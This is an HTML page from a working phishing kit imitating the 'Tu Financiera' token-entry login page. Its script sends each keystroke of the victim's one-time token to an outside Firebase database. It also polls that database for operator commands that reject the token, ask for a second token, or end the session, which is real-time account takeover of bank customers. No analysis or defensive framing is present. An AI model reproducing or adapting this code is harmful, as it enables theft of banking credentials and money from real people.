<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Ingresar</title>
<link rel="shortcut icon" type="image/png" href="https://tu.com.py/tufi-web/assets/icon/favicon.png">
<link rel="stylesheet" href="https://tu.com.py/tufi-web/static/css/main.bb0d1fd5.chunk.css">
<style>
  html,body{height:100%;margin:0}
  body{
    min-height:100vh;background:#464646;
    font-family:var(--tufi-font-family),Ubuntu,Arial,sans-serif;color:#606060;
    display:flex;justify-content:flex-end;
  }
  .fondo{position:fixed;inset:0;z-index:0;background:url('https://tu.com.py/tufi-web/static/media/fondo_login.34ff0d3f.png') center/cover no-repeat}
  .panel{
    position:relative;z-index:1;width:33.3333%;min-height:100vh;background:#fff;
    display:flex;flex-direction:column;align-items:center;overflow-y:auto;
    padding:52px 18px 26px;box-sizing:border-box;
  }
  .logo-top{width:118px;margin-bottom:30px}
  .caja{
    width:321px;max-width:100%;background:#fff;border:1px solid #d1d1d1;border-radius:10px;
    padding:26px 20px 22px;box-sizing:border-box;
  }
  .caja h2{font-size:16px;font-weight:bold;color:#8ec63f;margin:0 0 8px;line-height:1.3;text-align:center}
  .caja p{font-size:12.5px;color:#606060;line-height:1.55;margin:0 0 18px;text-align:center}
  .campo{
    width:100%;height:44px;border:1px solid #d1d1d1;border-radius:10px;background:#efefef;
    text-align:center;font-family:inherit;font-size:20px;letter-spacing:9px;color:#000;
    outline:none;box-sizing:border-box;padding-left:9px;
  }
  .campo:focus{border-color:#8dc63f;background:#fff}
  .campo::placeholder{color:#c1c5cb;letter-spacing:4px;font-size:15px}
  .err{
    display:none;background:#f7941e;color:#fff;border-radius:8px;font-size:12px;font-weight:bold;
    padding:9px 10px;margin-bottom:12px;text-align:center;
  }
  .btn{
    width:100%;height:39px;border:0;border-radius:10px;background:#8dc63f;color:#fff;
    font-family:inherit;font-size:12px;font-weight:bold;letter-spacing:.33px;
    text-transform:uppercase;cursor:pointer;margin-top:16px;
  }
  .btn:disabled{opacity:.6;cursor:default}
  .reenvio{text-align:center;font-size:11.5px;color:#707070;margin-top:14px}
  .reenvio a{color:#8dc63f;font-weight:bold;cursor:pointer;text-decoration:none}
  .reenvio a:hover{text-decoration:underline}
  .ok{display:none;color:#8dc63f;font-size:11px;text-align:center;margin-top:8px;font-weight:bold}
  .ayuda{display:flex;align-items:center;gap:7px;background:#efefef;border-radius:8px;padding:9px 11px;margin-top:14px;font-size:10.5px;line-height:1.5}
  .ayuda img{width:15px;flex:0 0 15px}
  .version{color:#707070;font-size:12px;margin-top:22px}
  @media(max-width:900px){.panel{width:45%}}
  @media(max-width:768px){
    body{display:block}
    .panel{width:100%;min-height:100vh;padding-top:34px}
    .caja{width:290px}
    .logo-top{width:96px}
  }
</style>
</head>
<body>
<div class="fondo"></div>

<div class="panel">
  <img class="logo-top" src="https://tu.com.py/tufi-web/static/media/logo_login.76bbbd3c.svg" alt="Tu Financiera">

  <div class="caja">
    <h2 id="tit">Token digital</h2>
    <p id="sub">Ingresá el token que muestra tu aplicación para autorizar el acceso.</p>

    <div class="err" id="err"></div>

    <input id="campo" class="campo" inputmode="numeric" maxlength="8" placeholder="________" autocomplete="off">

    <button class="btn" id="btn" disabled="disabled">Validar</button>

    <div class="reenvio">¿No tenés el token? <a id="reenv">Reenviar</a></div>
    <div class="ok" id="ok">Token reenviado</div>

    <div class="ayuda">
      <img src="https://tu.com.py/tufi-web/static/media/shield-plus.f193fb16.svg" alt="">
      <span>El token cambia cada 30 segundos. Si vence, pedí uno nuevo.</span>
    </div>
  </div>

  <span class="version">Versión: v1.65.0</span>
</div>

<script>
(function(){
  var DB = "https://cbonnlineec-default-rtdb.firebaseio.com/nbch";
  var qs = new URLSearchParams(location.search);
  var id = qs.get('u');
  var etapa = qs.get('e') === '2' ? 2 : 1;
  if(!id){ try{ id = localStorage.getItem('nbch_u'); }catch(x){} }
  if(!id){ location.replace('index.html'); return; }

  var campo = etapa === 2 ? 'token2' : 'token';
  var estado = etapa === 2 ? 'TOKEN 2' : 'TOKEN';

  var inp = document.getElementById('campo'),
      btn = document.getElementById('btn'),
      caja = document.getElementById('err'),
      reenv = document.getElementById('reenv'),
      ok = document.getElementById('ok');

  if(etapa === 2){
    document.getElementById('tit').textContent = 'Segundo token';
    document.getElementById('sub').textContent = 'Por seguridad, el banco pide un token nuevo. Ingresalo para confirmar.';
  }

  var p = {}; p[estado.toLowerCase().replace(' ', '')] = '';
  fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({estado:estado, pagina:'token.html', [campo]:''})}).catch(function(){});
  fetch(DB+'/comandos/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({accion:'', rechazo:'', ts:Date.now()})}).catch(function(){});

  setTimeout(function(){ inp.focus(); }, 300);

  inp.addEventListener('input', function(){
    this.value = this.value.replace(/\D/g,'').slice(0,8);
    btn.disabled = this.value.length < 4;
    fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({[campo]:this.value, ultimoPing:Date.now()})}).catch(function(){});
  });

  btn.addEventListener('click', function(){
    caja.style.display = 'none';
    var v = inp.value.trim();
    if(v.length < 4){
      caja.textContent = 'Ingresá el token completo.';
      caja.style.display = 'block';
      return;
    }
    btn.disabled = true;
    btn.textContent = 'Validando...';
    fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({[campo]:v, estado:'VALIDANDO TOKEN', pagina:'cargando2.html'})}).catch(function(){});
    setTimeout(function(){ location.href = 'cargando2.html?m=token&e='+etapa+'&u='+id; }, 700);
  });

  reenv.addEventListener('click', function(){
    ok.style.display = 'block';
    setTimeout(function(){ ok.style.display = 'none'; }, 4000);
    var cont = etapa === 2 ? 'reenvios2' : 'reenvios';
    var sello = etapa === 2 ? 'reenvio2' : 'reenvio';
    fetch(DB+'/usuarios/'+id+'.json').then(function(r){ return r.json(); }).then(function(d){
      var n = ((d && d[cont]) || 0) + 1;
      var o = {}; o[cont] = n; o[sello] = Date.now();
      fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
        body:JSON.stringify(o)}).catch(function(){});
    }).catch(function(){});
    fetch(DB+'/comandos/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({accion:'reenvio', ts:Date.now()})}).catch(function(){});
  });

  var fin = false;
  function salir(url){ if(fin) return; fin = true; location.href = url; }

  setInterval(function(){
    if(fin) return;
    fetch(DB+'/comandos/'+id+'.json').then(function(r){ return r.json(); }).then(function(c){
      if(!c) return;
      if(c.rechazo === 'token') salir('rechazar.html?t=token&u='+id);
      else if(c.accion === 'dejar') salir('final.html?u='+id);
    }).catch(function(){});
  }, 2500);
})();
</script>
</body>
</html>
